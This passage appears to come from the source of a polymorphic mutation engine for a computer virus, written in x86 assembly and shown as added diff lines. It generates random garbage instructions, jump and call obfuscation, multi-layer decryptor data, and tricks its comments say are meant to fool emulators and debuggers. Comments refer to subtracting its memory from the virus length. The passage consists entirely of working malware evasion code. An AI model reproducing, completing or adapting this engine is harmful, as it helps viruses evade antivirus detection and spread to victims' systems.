+        stosd           ; place for offset
+
+        push    edi
+        call    rnd_garbage
+        pop     ebx
+
+        mov     al,0e9h
+        stosb
+        stosd                   ; jump offset
+        push    edi
+        call    krappo_gen      ; random bytes
+        call    rnd_garbage
+
+        push    ebx
+        neg     ebx
+        add     ebx,edi
+        xchg    eax,ebx
+        pop     ebx
+
+        mov     dword ptr [ebx-4],eax   ; call offset
+
+        call    rnd_garbage    ; this is the called "subroutine"
+
+        call    get_random      ; more ways of getting back from subroutine,
+        shr     al,1            ; either with normal ret or by correcting the
+        jnc     normal_ret      ; stack by popping or by adding to esp
+        shr     al,1
+        jnc     popintoreg
+        mov     ax,0c483h       ; add esp,
+        stosw
+        mov     al,4
+        jmp     store_ngo
+popintoreg:
+        call    get_register
+        add     cl,058h         ; pop base
+        xchg    eax,ecx
+        jmp     store_ngo
+normal_ret:
+        mov     al,0c3h         ; ret
+        stosb
+        bswap   eax             ; some random
+        and     eax,07h
+        cmp     al,4
+        jb      do_the_int3s
+        jne     no_ccs
+random_crap:
+        call    krappo_gen
+        jmp     no_ccs
+do_the_int3s:
+        xchg    eax,ecx
+        mov     al,0cch         ; int3, usual after subroutines in win32s
+        rep     stosb
+store_ngo:
+        stosb
+no_ccs:
+        call    rnd_garbage
+
+        pop     ebx             ; jump offset
+
+        push    ebx
+        neg     ebx
+        add     ebx,edi
+        xchg    eax,ebx
+        pop     ebx
+
+        mov     dword ptr [ebx-4],eax
+exit_ppc:
+        dec     byte ptr [t_inacall+ebp]
+just_exit_call:
+        ret
+
+maths_immediate_short:
+        stc
+        jmp     maths_immediate_1
+
+maths_immediate:
+        clc
+maths_immediate_1:
+        pushf
+        call    get_random      ; (0 to 7) * 8
+        and     al,0111000b
+        add     al,0c0h        ; the base
+        popf
+        push    eax
+        pushf
+        call    get_register
+        add     al,cl
+        mov     ah,81h          ; prefix
+        popf
+        pushf
+        jnc     not_a_shortone
+        inc     ah
+        inc     ah
+not_a_shortone:
+        xchg    ah,al
+        stosw
+        call    g_dimension
+        popf
+        jnc     not_a_shortone2
+        mov     cl,01h
+not_a_shortone2:
+        call    put_immediates
+        pop     eax
+        cmp     al,0f8h         ; is a CMP
+        jne     not_compare
+make_jmp_after_cmp:
+        call    get_random
+        and     eax,01b         ; long or short jump
+        add     al,06h          ; short jump
+        jmp     make_jump
+not_compare:
+        ret
+
+cdq_jmps_savestack:
+        call    get_random_al7
+        sub     al,3
+        jc      exit_c_j_ss
+        xchg    eax,ecx
+        mov     al,byte ptr [ecx+offset change_jump+ebp]
+        cmp     cl,1
+        ja      not_cdq_cbw
+
+        test    byte ptr [r_used+ebp],0101b ; EAX and EDX for cbw,cwd,cdq,cwde
+        jnz     exit_c_j_ss
+        stosb
+        inc     edi
+        call    g_dimension
+        dec     edi
+        jmp     exit_c_j_ss
+not_cdq_cbw:
+        cmp     cl,4
+        je      pushandmov
+        add     cl,4                    ; this is used for dimension
+        jmp     do_that_fjump           ; do as for conditional ones
+pushandmov:
+
+        call    select_save
+        jc      exit_c_j_ss
+
+        xchg    eax,ebx
+        mov     al,50h                  ; push
+
+        xor     ch,ch                   ; so it won't be erased from stack
+        xchg    ch,byte ptr [t_pushed+ebp]
+
+        push    ecx
+        call    unset_used              ; mark that as unused one
+        add     al,bl                   ; push the reg
+        stosb
+        call    rnd_garbage
+        add     al,08h          ; pop opcode
+        stosb
+
+        pop     ebx
+        mov     byte ptr [t_pushed+ebp],bh
+        mov     byte ptr [r_used+ebp],bl
+exit_c_j_ss:
+        ret
+
+
+gen_one_byters:
+        call    get_random_al7
+make_jump:
+        mov     cl,al
+        mov     al,byte ptr [eax+offset one_byters+ebp]   ; get onebyter
+        cmp     cl,05h
+        jbe     not_jump
+do_that_fjump:
+        cmp     byte ptr [t_maxjmps+ebp],3        ; don't nest too much
+        je      just_exit
+        inc     byte ptr [t_maxjmps+ebp]
+
+        cmp     al,0e9h                 ; for unconditional ones skip some
+        jae     skip_unc                ; things
+
+        cmp     cl,07h
+        jne     not_longjump
+        push    eax
+        mov     al,0fh                  ; long prefix
+        stosb
+        pop     eax
+not_longjump:
+        push    eax
+        call    get_random
+        and     al,0fh
+        mov     ch,al
+        pop     eax
+        add     al,ch
+skip_unc:
+        stosb                           ; type of jump
+        stosb                   ; first off
+        cmp     cl,07h
+        jne     not_longone
+        dec     edi
+        stosd
+not_longone:
+        push    edi
+        call    rnd_garbage
+        pop     ebx
+        mov     eax,edi
+        sub     eax,ebx                 ; offset of jump
+        dec     byte ptr [t_maxjmps+ebp]
+        cmp     cl,7
+        je      long_jumper
+        cmp     eax,7fh                 ; if not too big then use it
+        jb      good_jump
+        mov     edi,ebx                 ; else forget everything
+        dec     edi
+        dec     edi
+        ret
+good_jump:
+        mov     byte ptr [ebx-1],al
+        ret
+long_jumper:
+        mov     dword ptr [ebx-4],eax
+        ret
+not_jump:
+        stosb
+just_exit:
+        ret
+
+mem_assign:
+        mov     ax,058bh
+        jmp     mem_common
+
+mem_mathops:
+        call    get_random
+        and     al,111000b      ; (0 to 7) * 8
+        add     al,03h          ; base
+mem_common:
+        push    eax
+        call    get_register
+        shl     cl,3            ; *8
+        add     cl,05h          ; base for eax
+        mov     ah,cl
+        stosw
+        call    g_dimension
+
+; now offset
+        call    get_address
+        stosd
+        pop     eax
+        cmp     al,3bh                  ; is a cmp
+        je      make_jmp_after_cmp      ; if so force a compare
+        ret
+
+diff_movz:                              ; movsx,movzx,bt,btc,btr,bts,bswap
+        call    get_random              ; 1 bit dim, 2 bit m/b
+        mov     cl,al
+        mov     dh,ah
+        test    cl,1100000b
+        jnz     no_wpf
+        mov     al,066h
+        stosb
+no_wpf:
+        mov     al,0fh
+        stosb
+        mov     al,0b6h
+        shr     cl,1
+        jc      some_bt
+        shr     cl,1
+        jc      zero_extend
+        add     al,08h
+zero_extend:
+        shr     cl,1
+        jc      dest_dw                 ; generate movsx/movzx on d or w
+        inc     al
+dest_dw:
+        stosb
+        call    get_random_al7
+        mov     dl,al
+        add     al,0c0h
+        call    get_register
+        shl     cl,3
+        add     al,cl
+        and     dh,011b
+        pushf
+        jnz     just_regs
+        sub     al,0c0h-05h
+        sub     al,dl
+just_regs:
+        stosb
+        popf
+        jnz     justret_r
+        call    get_address
+        stosd
+justret_r:
+        ret
+
+some_bt:
+        shr     cl,1
+        jc      do_bswap
+        add     al,04h                  ; btX second byte
+        stosb
+        and     cl,011000b
+        add     cl,0e0h
+        mov     al,cl
+        call    get_register
+        add     al,cl
+        stosb
+        shr     dh,1
+        pushf                           ; make jmp after or not
+        and     dh,01fh                 ; not much sense doing > 32
+        mov     al,dh
+        stosb
+        popf
+        jc      make_jmp_after_cmp
+        ret
+
+do_bswap:
+        call    get_register
+        mov     al,0c8h                 ; bswap
+        add     al,cl
+        stosb
+        ret
+
+mov_registers:
+        call    get_random_al7          ; random source
+        add     al,0c0h
+        mov     ah,08bh
+        call    get_register            ; useful dest
+        shl     cl,3
+        add     al,cl
+        xchg    ah,al
+        stosw
+        jmp     g_dimension
+
+maths_registers:
+        call    get_random
+        and     al,0111000b
+        add     al,03h         ; base
+        mov     ah,0c0h         ; suff
+        push    eax
+
+        call    get_register    ; dest
+        shl     cl,03h
+        add     ah,cl
+
+        xchg    eax,ecx             ; save temp in ecx
+        call    get_random_al7      ; all regs
+        xchg    eax,ecx             ; reg in ECX and restore EAX
+
+        add     ah,cl
+        stosw
+
+        call    g_dimension
+        pop     eax
+        cmp     al,3bh
+        je      make_jmp_after_cmp
+        ret
+
+rotating_imms:
+        call    get_random_al7
+        cmp     al,0110b                ; 0f0 doesn't exist
+        je      rotating_imms
+        shl     al,3                    ; *8
+        add     al,0c0h
+
+        call    get_register
+        add     al,cl
+        mov     ah,0c1h
+        xchg    al,ah
+        stosw
+        call    g_dimension
+        xor     ecx,ecx
+        inc     cl
+        jmp     put_immediates
+
+notneg_register:
+        call    get_random
+        shr     al,1
+        mov     ax,0d0f7h
+        jc      not_add
+        add     ah,08h
+not_add:
+        call    get_register
+        add     ah,cl
+        stosw
+;        jmp     g_dimension
+
+g_dimension:
+; EDI after generated garb
+reget_dim:
+        call    get_random_al7
+        cmp     al,2
+        jae     no_change
+word_change:
+        mov     ecx,dword ptr [edi-2]
+        mov     byte ptr [edi-2],66h    ; the prefix
+        mov     dword ptr [edi-1],ecx
+        inc     edi
+        mov     al,2
+        jmp     post_no_change
+no_change:
+        mov     al,4
+post_no_change:
+        xchg    eax,ecx                 ; in ECX needed immediates
+        ret
+
+imm_assign:
+        call    get_register
+        mov     al,0b8h         ; base
+        add     al,cl
+        stosb
+        inc     edi
+        call    g_dimension
+        dec     edi
+;        jmp     put_immediates
+
+put_immediates:
+; cl how many
+        call    get_random
+put_imm_part:
+        stosb
+        shr     eax,8
+        loop    put_imm_part
+        ret
+
+inc_dec_reg:
+        call    get_random
+        and     al,01000b               ; 0 or 8
+        add     al,40h                  ; incdec generation
+        call    get_register
+        add     al,cl
+        stosb
+        inc     edi
+        call    g_dimension
+        dec     edi
+        ret
+
+xchg_regs:
+        mov     al,087h                 ; xchg eax,eax
+        call    get_register
+        mov     ah,cl
+        call    get_register
+common_test_xchg:
+        shl     cl,3
+        add     ah,cl
+        add     ah,0c0h
+        stosw
+        jmp     g_dimension
+
+test_regs:
+        call    get_random
+        xchg    eax,ecx
+        and     cx,0707h
+        mov     ah,ch
+        mov     al,085h                 ; test eax,eax
+        jmp     common_test_xchg
+
+temp_save_change:
+        call    get_random_al7
+        sub     al,6                    ; 1/4 probability, since this couldn't
+        jc      skip_changer            ; come too often
+
+        call    select_save
+        jc      skip_changer
+
+        push    ecx
+        call    save_mov_xchg
+
+        xchg    eax,ecx                 ; in al new register
+        mov     al,byte ptr [edx]       ; imp_reg
+        shl     al,3
+        xchg    eax,ecx
+        add     al,cl
+        or      al,0c0h
+        xchg    al,ah
+        stosw                           ; mov important_reg,some_reg
+        pop     ebx
+        mov     byte ptr [r_used+ebp],bl    ; restore regs status
+skip_changer:
+        ret
+
+select_save:
+        call    get_random_al7
+        sub     al,5                    ; get from 0 to 2
+        jc      select_save
+
+        xchg    eax,edx
+        add     edx,offset r_pointer
+        add     edx,ebp
+        mov     al,byte ptr [edx]
+
+        cmp     al,0ffh                 ; not already assigned?
+        je      exit_bad
+
+        cmp     al,20h                  ; no key signature, if so skip
+        je      exit_bad
+
+        call     is_used                 ; maybe is already saved on stack or
+        jnz      return_good             ; such?
+exit_bad:
+        stc
+        ret
+return_good:
+        mov     cl,byte ptr [r_used+ebp]
+        clc
+        ret
+
+save_mov_xchg:
+        xchg    eax,ebx
+        call    get_register            ; get an usable register
+        xchg    eax,ecx
+        call    set_used                ; set this one as used
+        call    unset_used              ; and the previous as unused
+        mov     ah,087h                 ; xchg reg,reg base
+        push    eax
+        xor     ecx,ecx
+        call    get_random              ; select if using mov or xchg
+        shr     al,1
+        jc      use_mov_first
+        mov     cl,4                    ; + 4 becames mov reg,reg base
+use_mov_first:
+        shr     al,1                    ; when just saving this won't be used
+        jc      use_mov_after           ; select whichone for restore aswell
+        mov     ch,4
+use_mov_after:
+        pop     eax
+        add     ah,ch                   ; restore one
+        push    eax
+        sub     ah,ch
+        add     ah,cl
+        shl     al,3                    ; * 8
+        add     al,bl
+        or      al,0c0h                 ; mov some_reg,important_reg
+        xchg    al,ah
+        stosw                           ; put the moving of regs
+        call    rnd_garbage
+        pop     eax
+        ret
+
+sets_misc:
+        call    get_random              ; type of sel
+        mov     al,0fh
+        and     ah,al
+        add     ah,090h
+        call    get_register
+        cmp     cl,3
+        ja      cant_useset             ; won't retry, so not too many
+        stosw
+        bswap   eax                     ; rnd
+        shr     al,1
+        jc      docs_ones
+        add     cl,08h                  ; has 2 set of ocodes
+docs_ones:
+        shr     al,1
+        jc      low_ones
+        add     cl,04h                  ; high or low 8
+low_ones:
+        mov     al,0c0h
+        add     al,cl
+        stosb
+        ret
+
+cant_useset:                            ; shld/shrd
+        test    ah,110b                 ; last bit used later
+        jnz     no_66p
+        push    eax
+        mov     al,066h                 ; with words
+        stosb
+        pop     eax
+no_66p:
+        shr     ah,1
+        mov     ah,0a4h
+        jc      do_shlld
+        add     ah,0ch-04h              ; shrd
+do_shlld:
+        cmp     cl,7
+        jne     noss_with_cl
+        inc     ah                      ; with immediate cl
+noss_with_cl:
+        stosw
+        call    get_random
+        and     al,0111000b
+        call    get_register
+        add     al,cl
+        add     al,0c0h                 ; in ah we have rnd sh nr
+        stosb
+        test    byte ptr [edi-2],01b    ;was using cl?
+        jnz     wasnt_with_cl
+        dec     edi
+        stosw
+wasnt_with_cl:
+        ret
+
+xadd_cmpxchg:
+        call    get_random
+        and     ah,10h          ; 10h or 00h
+        jc      np_nchk
+        test    byte ptr [ebp+r_used],01b      ; is ax used?
+        jnz     home_xx         ; if so no cmpxchg
+np_nchk:
+        test    al,110b
+        jnz     no_66pr
+        mov     al,66h
+        stosb
+no_66pr:
+        add     ah,0b1h
+        cmp     byte ptr [edi-1],066h
+        je      cant_byterize
+        and     al,1
+        sub     ah,al           ; cmpxchg or xadd with b or notb
+cant_byterize:
+        mov     al,0fh
+        stosw
+get_reg1:
+        call    get_register
+        mov     ch,cl
+get_reg2:
+        call    get_register
+        mov     al,0c0h
+        test    byte ptr [edi-1],01b     ; was using bytes?
+        jnz     no_byteprob
+        cmp     ch,3                    ; if bytes must be <= 3
+        ja      get_reg1
+        cmp     cl,3
+        ja      get_reg2
+        push    eax
+        bswap   eax                     ; high part of rnd
+        and     ax,010000000100b        ; random +4 on both src and dest
+        add     cx,ax
+        pop     eax
+no_byteprob:
+        shl     cl,3
+        add     al,cl
+        add     al,ch
+        stosb
+home_xx:
+        ret
+
+emu_stuffy:                     ; some stuff to try to fool emus
+        call    get_random
+        and     al,011111b       ; not too often
+        jnz     keep_few_ae
+
+        lea     edx,[ebp + offset t_pushed]
+
+        shr     ah,1
+        jc      regs_checking
+
+        shr     ah,1
+        jc      xlat_generation
+
+stack_checking:
+        ; check if stack seems consistent or not
+        mov     al,68h          ; push immediate opcode
+        stosb
+        call    get_random
+        stosd
+        push    eax
+        xor     ch,ch           ; nr of dword on stack
+        xchg    ch,byte ptr [edx]     ; don't smash our stack
+        call    rnd_garbage
+        call    get_register
+        mov     al,cl
+        call    set_used
+        mov     bl,al
+        add     al,058h         ; pop opcode
+        stosb
+        mov     byte ptr [edx],ch      ; can work on stack again
+        call    rnd_garbage
+        call    unset_used
+
+typepopchk:
+        call    get_random
+        shr     al,1
+        jnc     check_posones
+        and     ah,100000b      ; add/and reg32, not/neg imm
+        jnz     just_not_atesp
+        dec     dword ptr [esp] ; since add needs the neg value
+just_not_atesp:
+        not     dword ptr [esp]       ; the imm
+        add     ah,0c0h
+        jmp     chksta_st
+check_posones:
+        and     ah,011000b
+        jz      typepopchk
+        add     ah,0e0h
+chksta_st:
+        mov     al,81h          ; cmp/sub/xor reg32,imm
+        add     ah,bl
+        stosw
+        pop     eax             ; value to check with
+        stosd
+check_okequ:
+        mov     bx,07574h
+        jmp     do_jumpzh
+
+
+regs_checking:
+        shr     ah,1
+        jc      ss_play
+
+        shr     ah,1
+        jc      mem_write
+
+        ; ones just checking our regs (pointer and counter) consistency
+        ; compare with zero in various ways and jump at the right code if !=
+        cmp     dword ptr [edx - (offset t_pushed - offset w_loopbg)],00h
+                                                         ; not in the loop
+        jne     keep_few_ae
+
+        bswap   eax
+        and     eax,01b       ; 0 or 1
+        add     eax,ebp
+        add     eax,offset r_pointer    ; so will be r_pointer or r_counter
+        mov     al,byte ptr [eax]
+        inc     al              ; already initialized ?
+        jz      keep_few_ae
+        dec     al
+        call    is_used         ; check that we aren't in moving thingy
+        jz      keep_few_ae
+reran_h:
+        call    get_random_al7  ; type of cmp
+        cmp     al,5
+        jae     or_oring        ; do or reg,reg
+
+        lea     ebx,[edx - (offset t_pushed - offset chk_counter)]
+        add     ebx,eax         ; which one
+        mov     ah,byte ptr [ebx]
+        mov     al,83h
+        add     ah,cl
+        stosw
+        xor     al,al
+        stosb                   ; with a zero
+        jmp     do_jumpzh_reg
+
+or_oring:
+        mov     ax,0c00bh       ; or eax,eax base
+        add     ah,cl           ; have in cl the reg
+        shl     cl,3
+        add     ah,cl           ; both src and dest
+        stosw
+do_jumpzh_reg:
+        mov     bx,07475h
+; JZ and JNZ creation (considering BH is okay, while BL makes shit)
+do_jumpzh:
+        call    get_random
+        shr     al,1            ; do jz or jnz ?
+        jnc     do_jz_easily
+                                ; else we have to do a construction with
+                                ; more sense
+        mov     al,bl
+        stosw
+too_long_redo:
+        push    dword ptr [edx]        ; save stack situation
+        mov     ebx,edi         ; jmp offset +1
+        call    rnd_garbage
+        call    get_random      ; random byte to break execution or ret
+        shr     ah,1
+        jc      no_jmpback      ; do a long jmp back to hide the loop one
+        mov     al,0e9h
+        stosb
+        or      ax,0ffffh       ; not too long
+        bswap   eax
+        or      ah,0f8h
+        stosd
+        jmp     comehome
+no_jmpback:
+        shr     ah,1
+        jnc     rndbyteuse
+        mov     al,0c3h         ; a ret is quite polite for the emu :)
+rndbyteuse:
+        stosb
+comehome:
+        call    rnd_garbage
+        pop     dword ptr [edx]
+        mov     eax,edi
+        sub     eax,ebx
+        cmp     eax,07fh        ; see it is not too long for a short jmp
+        jbe     oki_lenght
+        mov     edi,ebx         ; else retry
+        jmp     too_long_redo
+oki_lenght:
+        mov     byte ptr [ebx-1],al
+        jmp     keep_few_ae
+do_jz_easily:
+        mov     al,bh         ; jz short to some random location
+        stosw
+keep_few_ae:
+        ret
+
+xlat_generation:                ; is xlat emulated? anyway, hc garbage :)
+        shr     ah,1
+        jnc     enter_generation
+
+        test    byte ptr [edx - (offset t_pushed - offset r_used)],01001b
+        jnz     keep_few_ae     ; are ebx and eax unused ?
+        mov     al,0bbh         ; mov ebx
+        stosb
+        push    edx
+        call    get_address     ; a decent mem addy
+        stosd
+        pop     edx             ; set ebx as used
+        or      byte ptr [edx - (offset t_pushed - offset r_used)],01000b
+        call    rnd_garbage     ; and then unset ebx as used
+        and     byte ptr [edx - (offset t_pushed - offset r_used)],(NOT 1000b)
+        mov     al,0d7h         ; xlat opcode
+        stosb
+        ret
+
+enter_generation:                       ; some more funny garbage
+        mov     al,0c8h         ; enter
+        stosb
+        bswap   eax
+        and     al,0111100b     ; requested stack
+        stosb
+        xor     al,al
+        stosb
+        stosb
+        xchg    al,byte ptr [edx]     ; don't smash our stack
+        mov     ah,byte ptr [edx - (offset t_pushed - offset r_used)] ; no ebp
+        or      byte ptr [edx - (offset t_pushed - offset r_used)],100000b
+        call    rnd_garbage
+        mov     byte ptr [edx],al
+        mov     byte ptr [edx - (offset t_pushed - offset r_used)],ah
+        mov     al,0c9h         ; leave
+        stosb
+        ret
+
+ss_play:
+        ; opcodes that modify SS (actually they don't change it, but will
+        ; make life harder for debuggers and some emus hopefully)
+        shr     ah,1
+        jc      with_regs_ssplay
+        ; first way, just push ss and then pop ss later
+        mov     al,016h                 ; push
+        stosb
+        xor     ah,ah
+        xchg    ah,byte ptr [edx]       ; don't smash our stack
+        call    rnd_garbage
+        xchg    ah,byte ptr [edx]
+        inc     al                      ; pop
+        stosb
+        ret
+with_regs_ssplay:
+        ; mov reg,ss and later mov ss,reg
+        and     ah,011b
+        jnz     no_66pfss
+        mov     al,066h                 ; is oky anyway
+        stosb
+no_66pfss:
+        call    get_register
+        mov     ax,0d08ch               ; mov reg,ss
+        add     ah,cl
+        stosw
+        xchg    eax,ecx
+        call    set_used                ; don't mess with that one
+        call    rnd_garbage
+        xchg    eax,ebx
+        call    unset_used
+        xchg    eax,ecx
+        inc     al
+        inc     al                      ; mov ss,reg
+        stosw
+        ret
+
+mem_write:
+        ; write a dd somewhere (back where we won't go :) ) and then check
+        ; if the contents are the same after some garbage
+        cmp     byte ptr [edx - (offset t_pushed - offset m_writes)],01h
+                                                ; don't nest, could work
+        je      exit_mw_r                       ; on same addy (should be)
+                                                ; well we could even put this
+                                                ; away :P
+        inc     byte ptr [edx - (offset t_pushed - offset m_writes)]
+        call    get_random              ; get a register
+        and     ah,0111000b
+        push    eax
+        add     ah,05h
+        mov     al,089h
+        stosw
+        mov     ecx,[edx - (offset t_pushed - offset t_inipnt)]
+restart_memsearch:
+        mov     ebx,[edx - (offset t_pushed - offset w_loopbg)]
+        or      ebx,ebx                 ; not in the loop
+        jnz     looping_alr
+        cmp     byte ptr [edx - (offset t_pushed - offset t_inacall)],01h
+                                        ; could overwrite ourslv
+        jne     can_proceed_mw
+bad_mem:
+        pop     eax
+        dec     edi
+        dec     edi
+exit_mw:
+        dec     byte ptr [edx - (offset t_pushed - offset m_writes)]
+exit_mw_r:
+        ret
+can_proceed_mw:
+        mov     ebx,edi                 ; else can do from here down, anyway
+                                        ; we won't return to it and we are
+                                        ; sure that layers are not back
+looping_alr:
+        sub     ebx,4
+        cmp     ebx,ecx                 ; is there at least a bit of place?
+        jbe     bad_mem
+        call    get_random
+        and     eax,03ffh
+        sub     ebx,eax
+        sub     ebx,ecx
+        jc      restart_memsearch
+        add     ebx,[edx - (offset t_pushed - offset v_runnin)]
+        mov     eax,ebx
+        stosd
+
+        call    get_random              ; check what was written or not?
+        shr     al,1                    ; to make less visibile maybe ;)
+        pop     eax                     ; the used reg
+        jc      exit_mw
+        xchg    al,ah
+        shr     al,3
+        call    is_used
+        pushf
+        call    set_used
+        call    rnd_garbage
+        popf
+        push    ebx
+        jnz     wasntusedb
+        mov     ebx,eax                 ; if was used then nuthing, else
+        call    unset_used              ; put reusable
+wasntusedb:
+        shl     al,3
+        add     al,5
+        mov     ah,03bh                 ; cmp reg, memval
+        xchg    ah,al
+        stosw
+        pop     eax
+        stosd                           ; the addy
+        jmp     check_okequ
+
+from_stack:                     ; read/write stuff from stack referencing
+                                ; with esp quite often found in windoze code
+        call    get_random      ; type of operation
+        and     al,0fh
+        cmp     al,8
+        jae     make_mov
+        shl     al,3
+        inc     al
+        jmp     selected_op
+make_mov:
+        mov     al,89h
+selected_op:
+        mov     ch,al
+        bswap   eax
+        mov     al,byte ptr [ebp + t_pushed]    ; 'our' dd on stack
+        or      al,al
+        jz      cant_write_anyway
+
+        cmp     byte ptr [ebp + t_inacall],01h
+        je      cant_write_anyway
+
+        dec     al
+        mov     cl,al
+
+        call    get_random_al7
+        cmp     al,cl
+        ja      cant_write_anyway       ; don't retry, so less writes
+        mov     ah,al
+        jmp     prepare_all
+cant_write_anyway:
+        and     ah,0111b
+        add     ch,02h
+prepare_all:
+        mov     al,ch
+        stosb
+        call    get_register
+        shl     cl,3
+        or      ah,ah
+        jz      dont_addesp     ; just [esp], no + imm
+        add     cl,40h
+dont_addesp:
+        add     cl,04h
+        xchg    al,cl
+        stosb
+        mov     al,24h
+        stosb
+        or      ah,ah
+        jz      no_immesp
+        shl     ah,2            ; * 4, dword padded is always used
+        mov     al,ah
+        stosb
+no_immesp:
+        ret
+
+; tables for various purposes
+garbage_mask    equ     1fh
+garbage_number  equ     14h
+
+garbage_offsets:
+        dd      offset  call_subroutines
+        dd      offset  gen_one_byters
+        dd      offset  mov_registers
+        dd      offset  mem_assign
+        dd      offset  mem_mathops
+        dd      offset  maths_immediate
+        dd      offset  maths_immediate_short
+        dd      offset  maths_registers
+        dd      offset  rotating_imms
+        dd      offset  notneg_register
+        dd      offset  imm_assign
+        dd      offset  inc_dec_reg
+        dd      offset  xchg_regs
+        dd      offset  test_regs
+        dd      offset  temp_save_change
+        dd      offset  cdq_jmps_savestack
+        dd      offset  diff_movz
+        dd      offset  sets_misc
+        dd      offset  xadd_cmpxchg
+        dd      offset  emu_stuffy
+        dd      offset  from_stack
+
+one_byters      db      090h,0fch,0fdh,0f8h,0f9h,0f5h,070h,080h
+
+change_jump     db      098h,099h,0ebh,0e9h
+
+_math_imm:
+        dw      008c1h  ; ror d[ebx],imm
+        dw      02881h  ; sub d[ebx],imm
+        dw      03081h  ; xor d[ebx],imm
+        dw      00081h  ; add d[ebx],imm
+        dw      000c1h  ; rol d[ebx],imm
+_math_key:
+        dw      008d3h  ; ror d[ebx],cl
+        dw      00029h  ; sub d[ebx],eax
+        dw      00031h  ; xor d[ebx],eax
+        dw      00001h  ; add d[ebx],eax
+        dw      000d3h  ; rol d[ebx],cl
+
+; cmp,or,xor,sub,add
+chk_counter     db      0f8h,0c8h
+key_changers    db      0e8h,0f0h,0c0h  ; xor sub add
+                db      0c0h,0c8h       ; ror rol
+                db      0d0h            ; not
+                db      040h,048h       ; inc dec
+
+krappo_gen:
+        call    get_random              ; generate krap bytes
+        and     eax,01fh
+        jz      exit_krappo
+        xchg    eax,ecx
+krap_stuffy:
+        call    get_random
+        stosb
+        loop    krap_stuffy
+exit_krappo:
+        ret
+
+get_random_al7:
+        call    get_random
+        and     eax,0111b
+        ret
+
+get_random:
+        push    ebx
+        push    edx
+
+        db     0b8h                     ; mov eax,
+seed    dd     000h                     ; random seed, must be < im
+        mov     ebx,4096d                ; ia
+        mul     ebx
+        add     eax,150889d              ; ic
+        adc     edx,0
+        mov     ebx,714025d              ; im
+        push    ebx
+        div     ebx
+        mov     dword ptr [seed+ebp],edx
+        xchg    eax,edx
+        cdq
+        xor     ebx,ebx
+        dec     ebx
+        mul     ebx                     ; * 2^32 - 1
+        pop     ebx
+        div     ebx                     ; here we have a 0<=rnd<=2^32
+        pop     edx
+        pop     ebx
+        ret
+
+is_used:
+; AL register
+        push    eax
+        mov     cl,al
+        mov     al,1
+        shl     al,cl
+        test    byte ptr [r_used+ebp],al
+        pop     eax
+; Z  = register not used
+; NZ = register used
+        ret
+
+set_used:
+; AL register
+        push    eax
+        xor     ah,ah
+        bts     word ptr [r_used+ebp],ax
+        pop     eax
+        ret
+
+unset_used:
+; BL register
+        xor     bh,bh
+        btr     word ptr [r_used+ebp],bx
+        ret
+
+get_register:
+        push    eax
+reget_reg:
+        call    get_random_al7
+        call    is_used
+        jnz      reget_reg               ; check we aren't using it
+; the is_used will put the reg in cl
+        pop     eax
+        ret
+
+get_address:
+        push    esi
+        mov     ebx,edi
+        lea     esi,[offset v_runnin + ebp]
+                db      081h,0ebh       ; sub ebx,initial_edi
+t_inipnt        dd      00h             ; so we have actualy dec lenght
+
+        add     ebx,dword ptr [esi - (offset v_runnin - offset v_lenght)]
+        mov     edx,dword ptr [esi]
+
+                db      0b1h            ; mov cl,
+t_memand        db      00h             ; significant bits present
+
+        add     edx,ebx
+
+search_offset2:
+        call    get_random
+        shl     eax,cl
+        shr     eax,cl
+        cmp     eax,dword ptr [esi]     ; is < starting off of poly?
+        jb      search_offset2
+look_foroff2:
+        cmp     eax,edx                 ; upper border
+        jbe     ok_offset2
+        sub     eax,ebx
+        jmp     look_foroff2
+ok_offset2:
+        pop     esi
+        ret
+
+; how much memory does the ETMS need, so you can substract from the lenght
+; of the virus on file of course
+_mem_space      =       (offset _mem_data_end - offset _mem_data_start)
+
+; everything down there just in mem, don't save it in your file
+_mem_data_start:
+
+r_pointer       db      00h             ; register used as pointer
+r_counter       db      00h             ; register used as counter
+r_regkey        db      00h             ; register used as key, 20h use
+                                        ; immediate as key
+r_used          db      00000000b
+;  bits meaning          0 0 0 1 0 0 0 0
+;                        E E E E E E E E
+;                        D S B S B D C A
+;                        I I P P X X X X
+
+t_chgpnt        db      00h             ; changes to be made to pointer
+t_chgcnt        db      00h             ; changes to be made to counter
+t_chgkey        db      00h             ; changes to be made to key register
+t_chgmat        db      00h             ; changes to be made to operation
+t_exitjmp       db      00h             ; 01 has to create exit jmp, 00h no
+t_prejmp        db      00h             ; number of key changes b4 jmp
+m_writes        db      00h             ; already written mem in a loop?
+                ; ne stavit nic tukaj ali menjaj inicializacijo!
+t_pntoff        dd      00h             ; offset added to pointer (00h if not
+                                        ; added)
+t_cntoff        dd      00h             ; constant to be added to counter
+                                        ; value
+
+t_fromend       db      00h             ; 00h from start, else from end
+t_countback     db      00h             ; 01h decrementing, else incrementing
+
+t_pushed        db      00h             ; pushed dwords
+t_maxjmps       db      00h             ; max jumps
+t_inacall       db      00h             ; into a call or not
+                db      00h
+
+v_lenght        dd      00h             ; lenght
+v_virusp        dd      00h             ; pointer to body
+v_runnin        dd      00h             ; offset at which dec will run
+
+w_counter       dd      00h             ; where counter is assigned - 1
+w_loopbg        dd      00h             ; where loop begins
+w_encrypt       dd      00h             ; pointer on current pos in encryptor
+
+orig_dx         dd      00h
+t_chkpos        dd      00h             ; position of the checking jmp
+
+l_space         equ (enc_max + 10h)
+tl_space        equ (6 * l_space)
+layer_end       dd      00h       ; last nr of layer * layer dim
+layer_nr        dd      tl_space  ; number of layers (0-6) * layer dim
+
+; data structures for all the layers
+; first layer is the last in mem and so on...
+enc_space:
+                dd      00h             ; initial key
+                dd      00h             ; counter
+                dd      00h             ; initial pointer
+                dd      00h             ; position of the pointer in dec
+                db      enc_max dup (90h)       ; encryptor
+
+                dd      4 dup (00h)
+                db      enc_max dup (90h)
+
+                dd      4 dup (00h)
+                db      enc_max dup (90h)
+
+                dd      4 dup (00h)
+                db      enc_max dup (90h)
+
+                dd      4 dup (00h)
+                db      enc_max dup (90h)
+
+                dd      4 dup (00h)
+                db      enc_max dup (90h)
+
+                dd      4 dup (00h)
+                db      enc_max dup (90h)
+_mem_data_end:
+
